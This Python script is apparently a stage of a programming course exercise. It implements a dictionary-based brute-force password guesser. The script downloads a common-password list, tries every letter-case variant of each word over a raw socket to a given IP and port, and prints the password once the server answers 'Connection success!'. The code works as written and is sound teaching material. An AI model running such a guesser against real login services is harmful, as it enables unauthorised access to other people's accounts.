import argparse
import socket
import itertools
import string
import urllib.request

parser = argparse.ArgumentParser(description='Stage 3/5: Smarter, dictionary-based brute force')
parser.add_argument('ip', help="IP address")
parser.add_argument('port', type=int, help="Port number")
args = parser.parse_args()


def case_permutations(word):
    digits = {i: c for i, c in enumerate(word) if c in string.digits}
    word_without_digits = [x for x in word if x not in string.digits]

    for pattern in itertools.product((0, 1), repeat=len(word_without_digits)):
        letter_permutations = [w.swapcase() if p else w for w, p in zip(word_without_digits, pattern)]
        for i, c in digits.items():
            letter_permutations.insert(i, c)
        yield ''.join(letter_permutations)


def find_password():
    with socket.socket() as client_socket:
        client_socket.connect((args.ip, args.port))

        for line in urllib.request.urlopen('https://stepik.org/media/attachments/lesson/255258/passwords.txt'):
            for password in case_permutations(line.decode().strip()):
                client_socket.send(password.encode())
                response = client_socket.recv(1024).decode()

                if response == 'Connection success!':
                    return password


print(find_password())
